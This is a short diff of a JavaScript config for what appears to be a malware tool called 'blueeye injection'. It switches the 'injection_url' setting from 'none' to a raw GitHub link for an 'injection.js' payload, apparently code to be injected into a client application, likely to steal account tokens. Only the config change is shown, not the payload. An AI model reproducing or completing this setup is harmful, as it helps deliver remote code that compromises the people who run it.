@@ -14,7 +14,7 @@ const config = {
   embed_name: 'blueeye injection', 
   embed_icon: 'https://static.zerochan.net/Kagenou.Cid.full.3776136.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'none', 
+  injection_url: 'https://raw.githubusercontent.com/Raffi2020/blueeye/main/injection.js', 
   /**
    
    **/
